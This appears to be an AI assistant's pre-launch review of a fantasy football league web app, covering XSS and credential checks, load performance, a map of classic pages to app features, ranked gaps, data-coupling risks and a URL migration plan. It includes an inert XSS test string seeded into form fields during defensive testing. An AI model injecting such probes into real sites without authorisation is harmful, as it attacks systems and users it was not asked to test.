  This is fine once it becomes index.html (root manifest), but check the title and icon at go-live.

---

### Checked and fine
- **XSS**: I seeded `<img onerror><b class=xss>` into chat, the trade note and reasons, the block note, the perk note, the passphrase request note,
  the poll question and options, feedback, and settings, then rendered Home, Needs-you, Trades, Credits, Desk and Chat. No element was injected and no handler fired.
  `esc()` (index.html:827) is used consistently, and `toast()` uses textContent.
- **Inputs**: every input, textarea and select is 16 px (pin is 26 px), so iOS won't zoom on focus.
- **Safe areas**: `env(safe-area-inset-*)` is applied to the header, tabs, sheets, desk, welcome screen and floating pills.
  Chat height follows `visualViewport` (`--vvh`) so the keyboard doesn't cover the composer. This still needs a real-iPhone check in standalone mode.
- **Flows that worked**: needs-you sheet, box score, rivalry (empty "never met" state), player profile, trade start → pick → preview → send → nudge box,
  accept → 24 h review, counter opens a prefilled builder, perk request (Todd: Extra FAAB), Weeks replay, Vault (Seasons/Records/Owners/Draft),
  Rulebook sheet, owner profile, chat room send, DM with a live trade card, settings, commish desk, the 7-step tour, request access, wrong passphrase.
  Slow backend (8 s delay): spinners and the gold bar behave.
- **Credentials**: the passphrase is stored in plain text in localStorage (`maffl_lab_pin`). It's only sent in POST bodies, never in URLs. That's acceptable for this threat model.
  `maffl_lab_api` can override the API URL from localStorage, which is a debug hook; consider removing it at go-live.

### Performance (measured)
- First load: index.html 424 KB (116 KB gzipped). Six synchronous data scripts at the end of body, 480 KB (75 KB gz; vault 177 KB, matchups 158 KB, weekfacts 112 KB).
  Before boot it also fetches weekly.html 302 KB (62 KB gz), prize.html 87 KB and credits.html 56 KB. Right after boot come
  rules.html 120 KB and the draft CSV 375 KB (68 KB gz), plus the logo at 893 KB.
  Total ≈ 2.7 MB raw; over the wire ≈ 0.5 MB gzipped text + 0.9 MB logo.
- Boot in headless Chromium on localhost: DOMContentLoaded about 155 ms, boot screen hidden about 150–300 ms after load.
  With 4x CPU throttle and 1.5 Mbps / 150 ms (no gzip on the test server, so worst case): about 17 s to first screen.
  With gzip, a realistic estimate is 5–7 s on slow 3G and 1–2 s on LTE. The logo is the biggest single cost.
- localStorage is about 80 KB (live 40 KB, daily 33 KB, summary 7 KB). Fine.
- The data files block parsing, but they come after the boot markup, so the boot screen paints first. Note that `new Function()` evals data pulled out of fetched HTML pages, so
  any markup change on weekly, prize, credits or power-rankings can break the app.

### Needs a real iPhone (couldn't verify headless)
Keyboard over the chat composer and the passphrase toast in standalone mode, the status-bar overlap on the Desk header, pull-to-refresh being absent, and sms:/mailto: links.

---

# Part C: Classic site → REEL element map


Read-only review of `main` at /home/claude/maffl, 2026-11-07. App = `lab/index.html` (+ `lab/vault-data.js`, `lab/weekfacts-data.js`).
Every row was checked with grep against the app source. Line numbers (L####) point into `lab/index.html`.

**Status legend:** ✅ in REEL · 🟡 partial · 🔗 link-out/embed of the classic page · ❌ missing · 🗑️ retire candidate

**What the REEL app has today (code, not docs):** bottom tabs Home · Team · Match · Chat · League, with More behind your avatar.
- **League** tab sub-tabs (L2109): Standings · Weeks · 🗄️ Vault · Rules & $.
- **Vault** sub-tabs (L1362): Seasons · Records · Owners · Draft.
- **Sheets** (L2844): player, owner, rivalry (an iframe of the classic page), rules/rule, prizes, coach, vault season, box, builder, perk, settings.
- Note: REEL.md says League has a "History" section with classic tiles. The code replaced it with the Vault (L2110).

---

### index.html (current home page; the app replaces it at go-live)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Header brand + hamburger nav (9 links) | ✅ | Bottom tab bar + More (avatar). Several destinations are still 🔗, see below |
| "What's New" carousel (3 slides hand-edited by the commish: Pulse, Rivalry v2, Speak Up) | 🗑️ | Replaced by the Home feed. One-off news goes out as the desk's 📣 Commish alert card (L3248) |
| Quick Access → Weekly Pulse | ✅ | Home feed (this week) + League → Weeks (replay any week) |
| Quick Access → Rulebook & Info | ✅ | League → Rules & $ → Rulebook sheet (searchable) |
| Quick Access → Credits | ✅ | Team → Credits (balance, history, perks) + 💳 column in Standings |
| Quick Access → Prizes & Dues | 🟡 | League → Rules & $ → Prizes sheet. Dues show only as a Needs-you card when you owe (see prize.html) |
| The League → Power Rankings | 🟡 | Owner sheet (ratings + scout). No ranked list of owners (see power-rankings.html) |
| The League → Auction Draft | 🟡 | League → Vault → Draft (simple search) + player sheet (see draft.html) |
| The League → Rivals | 🟡 | Rivalry sheet only from a game or owner. No free pair picker (see rivalry.html) |
| The League → History & Stats | ✅ | League → 🗄️ Vault |
| Speak Up CTA | 🔗 | `../speakup.html` from League → Rules & $ and More (L2127, L2140) |
| Footer: version pill, "Last Updated", "League Founded 2002" | ❌ | No site version or updated stamp in the app. More shows only the backend version. CLAUDE.md's pill/stamp convention needs a new home |
| `<title>` + meta description (SEO) | ❌ | Lab has `noindex, nofollow` and the title "MAFFL HQ · Lab", with no description. Change both at the swap |
| Favicon / apple-touch-icon | ✅ | Present, but as `../maffl-logo.png` (path fix needed) |
| `manifest.json` link, `apple-mobile-web-app-title`, theme-color | ❌ | Lab has none of the three (only `apple-mobile-web-app-capable` + status-bar). Add them or the Home-Screen name and colour regress |
| Google Analytics (gtag G-5Q57008B9Y) | ❌ | On all 13 classic pages, missing from the app. Visitor stats stop at the swap unless it's added (or the TapLog becomes the replacement) |
| "Next up" carousel / key dates / announcements | n/a | **Not on index.html** (verified by grep). Key dates live on weekly.html; announcements live on rules.html (News & Announcements) |

### weekly.html (Weekly Pulse)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Week picker + archive (`?week=N`) | ✅ | League → Weeks: the whole app replays that week |
| News card (headline, subhead, up to 6 news-reel items in sections) | 🟡 | 📣 "Your tier" card uses the headline/subhead (or Claude's tier line). The news reel is only mined for mentions of your team (L1433); the full write-up isn't shown anywhere |
| 🗓️ Key Dates strip | ✅ | Home "Heads up" deadline card + League → Rules & $ → Key dates. The key-date `link` field (e.g. `rules.html#credit-system`) is unused |
| Standings card (tiers, divisions) | ✅ | League → Standings (tier toggle, 💳 column) |
| Post-Season card ("if the season ended today" seeds, WC) | 🟡 | Your own seed on the Team hero + division/promotion race cards. No full seed/bracket view for everyone |
| Survivor card (both pools) | ✅ | Home feed 🛟 Survivor (`survivorPool`, L1209) + `surv` card |
| Credit Tracker + Highest Weekly | ✅ | Home 💳 credit board card (`creditTrackerHTML`, L1188) + credit-race cards |
| Results card | ✅ | Home result card (box score) + League → Standings "Week N scores" |
| Preview card (next week's whole slate with stakes) | 🟡 | Only your Up next card + the Match tab. `previewsFor()` builds the slate but nothing shows it |
| Coach of the Week card | ✅ | Coach card + coach sheet (incl. "Could have won") |
| Elite 5 | ✅ | `elite5` card |
| Week 0 auction draft recap card (`draftRecap`) | ❌ | The app never reads `draftRecap`. Offseason/draft mode is still open (APP_DESIGN §8) |
| Preseason/offseason placeholder (→ draftday / PR) | ❌ | Offseason mode isn't defined yet (only the reel budget changes) |
| Share link `weekly.html?week=N` (in commish emails) | 🔗 | Keeps working only while weekly.html stays up. The app has no `#week` route |
| The Pulse page itself | 🗑️ | REEL.md: retire at go-live (daily run + card lines replace it). **But the app still boots from its `WEEKS` data** (see Coupling) |

### rivalry.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Head-to-head result accordions (This Week/Next Meeting/Recent Form, The Story, Big Games, Streaks & Scoring, Shared History, All N Meetings) | 🔗 | Rivalry sheet = iframe `../rivalry.html?embed=1#vs=A,B` (L833). A native `rivalrySheet()` exists (L2868) but nothing calls it |
| Owner picker (Active/All filter, pick two owners) | ❌ | Hidden in embed mode. In the app you can only reach a pair from a game, an owner sheet (most played / owns / nemesis), or "You vs. them" |
| One owner vs. the field (`#owner=X`) | 🟡 | Owner sheet shows 3 most-played + owns + nemesis. No full record vs. everyone |
| "Week N Rivalries" slate | ❌ | Hidden in embed. Match shows only your game |
| Discovery tab "MAFFL's Best" (9 boards: top-rated, postseason clashes, closest, lopsided, nail-biters, streaks, budding, high-scoring, blowouts) | ❌ | No equivalent. Vault → Records has blowouts only |
| Ratings & badges explainer | ❌ | Hidden in embed (`#explainH2H`) |
| Deep links `#vs=A,B`, `#owner=X` | 🔗 | Keep working while rivalry.html stays. The app catches `rivalry.html#vs=` links and opens its sheet (L3004) |

### power-rankings.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Owner grid ranked by 2026 Power Rank + filters (All/Active/Upper/Lower) | ❌ | No ranked list anywhere. Vault → Owners is Active/Former sorted by titles; the rank only shows as a pill on the owner sheet |
| Card header: rank, OVR | ✅ | Owner sheet hero: Power Rank #, OVR, Clutch/Grind/Heat bars |
| Overview tab: current team, tenure, team-name progression, season timeline | ✅ | Owner sheet: team names, trophy case, "Every season" strip (tap a year → Vault). Co-owner pairs aren't called out |
| Rank tab: ratings + scout notes | ✅ | Owner sheet → 📋 Scout report |
| Rivals tab: top-3 *rated* rivalries | 🟡 | Owner sheet → Rivalries (most played / owns / nemesis), but no rivalry rating |
| Rivals tab: Big Game Matchups (the owner's playoff games) | ❌ | Not in the owner sheet. Season sheets list playoff games only one year at a time |
| Draft tab: spent, picks, biggest splash by position | ✅ | Owner sheet → 💸 At the auction |
| `OWNERS_DATA` (hand-authored ratings, scout, timeline) | 🔗 | The app **fetches power-rankings.html and parses the array** (L2891). This page can't be retired until that data moves |

### history.html (History & Stats)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| History tab: eras → seasons | ✅ | Vault → Seasons (grouped by era) → season sheet |
| Season: division winners + standings | ✅ | Season sheet division tables |
| Season: Upper playoff bracket graphic | 🟡 | A list of playoff games, no bracket graphic |
| Season: Lower-tier bracket | 🟡 | Lower-tier champ only. `vault-data.js` playoffs are Upper only |
| Season: Relegation Bracket (2024, one-off) | ❌ | Not in vault-data |
| Season: Founding Era roster (2002–04) | ✅ | 2002–04 seasons exist in vault-data (Founding era) |
| Season: Draft highlights → Biggest spends | ✅ | Season sheet "Draft · biggest spends" |
| Season: Draft highlights → Champion's draft | ❌ | Not shown |
| Stats tab: sortable all-time owner table (≈30 columns, Active/Inactive, column groups: Accolades / Power / W-L splits / Points splits) | 🟡 | Vault → Records top-10 lists (titles, win %, points, playoff trips, top scores, blowouts, buys) + owner sheet. Missing: sortable table, PA, postseason W-L/PF, 3rd places |
| Stats notes (coverage caveats) | 🟡 | One line ("Scores ran higher once Superflex…") |
| Embedded CSV blobs (seasons, divisions, drafts, matchups) | ✅ | Not read by the app. The Vault uses `lab/vault-data.js` built from gold (`vault-data.yml`). No coupling |

### stats.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| All-time owner stats table | 🗑️ | Orphan: no nav or page links to it, and history.html's Stats tab is a port of it. Retire, or redirect to the History page/app |

### draft.html (Auction Draft)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Search: player box + filters (owner, team, position, tier, year range), results table | 🟡 | Vault → Draft: player-or-owner text + a single year, top 60 by price. No position/tier/team filters or year range |
| Player profile modal (draft history) | ✅ | Player sheet (season + price history, owners, title pedigree, trade value) |
| 🎱 8 Ball tab (random fact generator: `FACT_GENERATORS` + `ORACLE_TIDBITS`) | 🟡 | Reborn as the Vault 8 Ball card series (25 hand-written tidbits). The roll-a-fact generator is gone; the app links "Classic draft portal (8 Ball, tendencies)" (L1394) |
| Owner Profiles: Draft Tendencies (position spend share) | 🟡 | Owner sheet "Loves {pos} x% of picks". No spend-share breakdown |
| Owner Profiles: "Ahead of the Game" | ❌ | No equivalent |
| Owner Profiles: full draft history per owner | 🟡 | Vault → Draft search by owner (top 60 by price, not grouped by year) |
| Deep links `?year=YYYY`, `#owner=key` | 🔗 | Keep working while draft.html stays |

### draftday.html (Draft Day, seasonal)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Countdown to Draft Day | ❌ | Nothing in the app (only a key-date card if it's in the CSV) |
| Commish Notes | ❌ | Could be a 📣 Commish alert |
| How the Morning Runs (run of show) | ❌ | — |
| The Two Drafts (times per tier, ESPN draft-room links) | ❌ | Owners get no ESPN link in the app; "Open ESPN" exists only on the commish desk (L3128) |
| Google Meet link | ❌ | — |
| Inbound links (weekly.html preseason placeholder, rules.html) | 🔗 | Page keeps working if kept |

### credits.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Current Credit Count (by tier) | ✅ | Standings 💳 column + Team → Credits balance (live from the registry) |
| Credit Registry: league-wide ledger, search, owner/type/category facets | 🟡 | Team → Credits → history shows **your** rows only. No league-wide ledger |
| Request Form (Google Form iframe) | 🗑️ | Replaced by credits inside trade offers + perk requests (APP_DESIGN §5). **But the app still links "Credit requests (form)" → `../credits.html` in 2 places (L2127, L2140)**: remove at go-live |
| `REGISTRY_DATA` (written by the credit-sync robot) | 🔗 | The app fetches credits.html and parses it for every balance (L952). The page must stay |

### prize.html (Prizes & Dues)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Dues tab: season dues status for every owner | 🟡 | Only a Needs-you "Dues are due" card for you (L1673). No league-wide paid/unpaid view (Team → Money was retired 11/7) |
| Dues: Venmo pay button (`venmo.com/u/mmurello`) | ❌ | The dues card says "Pay the commish" but has no link. One-line fix |
| Dues Ledger | ❌ | Not in the app |
| Prizes → Career Earnings leaderboard + grand total | ✅ | Prizes sheet (all-time earnings, total paid) + owner sheet 💰 |
| Prizes → Prize History (category/place pills, timeline) | 🟡 | Prizes sheet shows only the latest year's payouts |
| `const MAFFL` (prizes + dues data) | 🔗 | The app fetches prize.html and parses it (L951). The page must stay |

### rules.html (Rulebook & Info)

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Rulebook sections (General → MAFFL Ghost) | ✅ | Rules sheet, parsed live from rules.html (`.rule-section`) |
| Rule search | ✅ | Search box in the Rules sheet |
| Info: League Info, Annual Milestones, 2026 Tier & Division Alignment | ✅ | Same list (they're `.rule-section` too) |
| Info: News & Announcements (`NEWS_FEED`) + "New in the Rulebook" (`RULE_UPDATES`) | 🟡 | Filled in by JS, so the app's parser sees an empty body and drops it. Nearest substitute: 📣 Commish alert card |
| `#section` deep links (e.g. `#credit-system`) | 🔗 | The app's perk sheets link `../rules.html#credit-system` (L2598) |

### speakup.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Rule Suggestions form | 🔗 | More / League → Speak Up → classic page (in-app Speak Up is "later", §5) |
| MAFFL HQ Feedback form | 🔗 | Same. The in-app 🧪 Feedback button is beta crew only |
| Launch Poll form | 🗑️ | Was for the classic site's launch. Polls are now reel cards (`poll:*`) |

### overview.html

| Element | Status | Where in REEL / gap note |
|---|---|---|
| Welcome / What Is MAFFL HQ / Map of the Site | 🗑️ | Describes the classic site. The REEL tour replaces it (More → Show the tour again). Only draftday links here. APP_DESIGN §2c's "More → About MAFFL" is not built |

### manifest.json / icons

| Element | Status | Where in REEL / gap note |
|---|---|---|
| `manifest.json` (start_url `./index.html`, standalone, navy theme, logo icon) | 🟡 | Works as-is once the app is index.html, **but the app doesn't link it** (no `<link rel="manifest">`). Existing Home-Screen icons point to index.html, so they'll open the app |

---

### Gaps to decide before go-live (ranked)

1. **Guest/logged-out view**: index.html becomes a passphrase wall. Guest "Just browsing" isn't built (§4, §9 checklist). Suggested home: a guest mode on the Welcome screen (League tab + Vault read-only).
2. **App paths and the lab-only head**: 27 lines (33 refs) use `../` and would break at the root. Also `noindex`, "· Lab" title, no manifest/app-title/description, no analytics. Suggested home: a go-live build step that rewrites paths and the head (see Link plan).
3. **Pulse data feed after retirement**: the app boots from `weekly.html` `WEEKS`. If the Pulse stops, the Weeks archive freezes. Suggested home: keep the gold append writing WEEKS, or generate `pulse-data.js` (§6 already plans this).
4. **Power Rankings list + ratings source**: no ranked list in the app, and ratings/scout come from parsing power-rankings.html. Suggested home: League → Vault → Owners sorted by Power Rank, with tier filter chips; move `OWNERS_DATA` to a data file.
5. **Rivalry discovery + free picker**: picker, 9 "MAFFL's Best" boards, week slate and explainer are all hidden in embed. Suggested home: Vault → Records "Rivalries" block + a two-owner picker. Or decide the classic page stays as the deep view.
6. **Dues: Venmo + league status**: no pay link, no who's-paid view. Suggested home: add a Venmo button to the dues card and a Dues section under League → Rules & $.
7. **Draft day / offseason mode**: countdown, run of show, ESPN draft-room + Meet links, and the Week 0 draft recap all have no home. Suggested home: offseason Match tab = Draft Day card; recap as reel cards (§8 open question).
8. **Next-week slate + full Pulse news reel**: owners lose the league-wide preview and the written news items. Suggested home: League → Standings "Week N+1 games" from `previewsFor()`, plus a "The week" card that holds the news reel.
9. **League-wide credit registry**: only your own rows are visible. Suggested home: League → Rules & $ → Credits ledger sheet with an owner filter.
10. **Announcements / rule updates**: `NEWS_FEED` and `RULE_UPDATES` are dropped. Suggested home: show them at the top of the Rules sheet, or post them as 📣 alert cards.
11. **Stats table depth**: no sortable career table, PA, or postseason splits. Suggested home: Vault → Records "Full table" (horizontally scrolling, sortable).
12. **Draft search filters / Ahead of the Game / 8 Ball roll**: Suggested home: Vault → Draft filter chips (position, tier, year range). Otherwise keep linking the classic portal.
13. **Prize history over time**: Suggested home: Prizes sheet year picker.
14. **Stale "Credit requests (form)" links**: Suggested fix: delete at go-live (§5 retires the form).
15. **Minor history gaps**: Lower-tier and relegation brackets, champion's draft, Big Game Matchups per owner. Suggested home: season sheet + owner sheet sections (needs vault-data fields).
16. **Version/Last Updated stamp**: CLAUDE.md requires one per page. Suggested home: a footer line in More.

### Coupling risks (the app reads classic pages at runtime)

| Classic file | How the app reads it | Risk |
|---|---|---|
| `weekly.html` | `fetch` + `extract("const WEEKS = ")` / `SHORT_NAMES` via `new Function` (L957) | **Boot-critical**: if this fails, the app has no teams or standings. Any reshaping of WEEKS breaks it. Retiring the Pulse freezes history |
| `credits.html` | `fetch` + `extract("const REGISTRY_DATA = ")` (L952) | Every live credit balance. The robot writes this page, so it must stay and keep the same shape |
| `prize.html` | `fetch` + `extract("const MAFFL = ")` (L951) | Prizes sheet, owner prize money, dues card |
| `rules.html` | `fetch` whole HTML, `DOMParser` on `.rule-section/.rule-title/.rule-body` (L2955) | Renaming a class silently empties the rulebook. JS-rendered sections are lost |
| `power-rankings.html` | `fetch` + `extract("const OWNERS_DATA = ")` (L2891) | Ratings, scout, timeline. Hand-authored data lives inside a page |
| `rivalry.html` | iframe `?embed=1#vs=A,B` (L833) | Every rivalry panel. Embed CSS hides chrome; a layout change shows up in the app |
| `schedule-data.js`, `matchups-data.js`, `key-dates-data.js`, `draft-summary-data.js` | `<script src="../…">` (L816–821) | Fine (data files), just the path fix |
| `data/MAFFL_Draft_History_Clean_v3.csv`, `data/MAFFL_Top_Performers_2026.csv` | `fetch` (L2235) | Path fix. The draft CSV is on the critical path for the player sheet and Vault Draft |
| `lab/vault-data.js`, `lab/weekfacts-data.js` | `<script src>` relative to `lab/` | Moving to root breaks them unless kept at `lab/` and re-pointed. `vault-data.yml`, `gen_vault.py`, `gen_lab_weekfacts.py` write to `lab/` |
| Hard-coded app URL | `APP_LINK` (L871) and backend `APP_URL` (`_ops/apps-script/logic.js:19`) = `…/maffl/lab/` | Text/email nudges and `#offer-ID` links keep sending people to the lab |

`extract()` runs the fetched page text with `new Function`. That's same-origin so it's safe, but brittle: a trailing comment or a template literal in those blocks can break parsing.

### Go-live link plan (what the index.html swap does to old URLs)

- **`/maffl/` and `/maffl/index.html`**: become the app. Home-Screen icons and bookmarks land in the app, but behind the passphrase wall until guest mode exists. `manifest.json` start_url `./index.html` keeps working, but the app must add `<link rel="manifest">`, the app title and theme-color.
- **App asset paths**: moving lab/index.html to the root turns `../x` into `/x` outside the `/maffl/` project path, which 404s on GitHub Pages. That's 33 refs on 27 lines: data scripts, 5 page fetches, 2 CSVs, the rivalry iframe, 6 logo refs, classic links. Rewrite `../` → `` and `vault-data.js`/`weekfacts-data.js` → `lab/…` (or move the files and update the 3 generators + workflow). Do it as a scripted transform, not by hand, so the lab copy keeps working.
- **`/maffl/lab/`**: beta crew bookmarks and every link the app/backend already texted or emailed (`APP_LINK`, `APP_URL`, `#offer-ID`). Replace lab/index.html with a redirect to `../index.html` that keeps `location.hash`, or keep a lab copy for testing behind a different path. Update `APP_LINK` and `APP_URL`.
- **Classic pages** (`weekly.html?week=N`, `rivalry.html#vs=A,B` / `#owner=`, `rules.html#credit-system`, `draft.html?year=` / `#owner=`, `credits.html`, `prize.html`, `power-rankings.html`, `history.html`, `speakup.html`): URLs don't change, so all bookmarks and deep links survive **as long as the files stay**. Five of them are runtime data sources and can't be deleted anyway. Their header "MAFFL HQ" brand links to `index.html`, which is now the app. That's good: it's a natural way back.
- **Classic nav menus**: still list every classic page. Consider adding "Open the app" or leaving them as-is ("old home folds into League").
- **Retire candidates** (`stats.html`, `overview.html`, later `draftday.html`/`speakup.html`): if removed, leave a stub that redirects to `index.html#league` (stats → `history.html`) so stray links don't 404.
- **Analytics**: the swap drops gtag from the front door. Add it to the app or accept the TapLog as the measure.
